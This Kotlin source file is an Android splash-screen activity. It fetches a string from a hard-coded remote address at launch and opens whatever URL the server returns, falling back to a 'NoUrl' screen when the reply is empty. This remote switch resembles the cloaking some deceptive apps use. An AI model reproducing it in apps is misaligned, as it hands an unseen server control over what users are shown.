package com.example.test

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat.requestPermissions
import java.io.BufferedReader
import java.net.HttpURLConnection
import java.net.URL


class SplashScreenActivity : AppCompatActivity() {

    private val SPLASH_TIME_OUT:Long = 3000// 1 sec
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        val func = Func()

        if (!func.checkPermission(applicationContext)) {
            requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE), 200)
        }

        Handler().postDelayed({
            val url = URL("https://casweno.online/GSRnr9dW")
            if (func.checkForInternet(this)) {
                Thread {
                    with(url.openConnection() as HttpURLConnection) {
                        val url = inputStream.bufferedReader().use(BufferedReader::readText)
                        Log.d("threadRequest", url)
//                        url=""

                        if (url != "") {
                            val intent = Intent(this@SplashScreenActivity, Url::class.java)
                            intent.putExtra("URL", url)
                            startActivity(intent)
                            Log.i("InterEx", "not null")
                            finish()
                        } else {
                            startActivity(Intent(this@SplashScreenActivity, NoUrl::class.java))
                            Log.i("InterEx", "null")
                            finish()
                        }
                    }
                }.start()
            } else {
                func.onAlertDialog(View(this))
            }
        }, SPLASH_TIME_OUT)
    }


}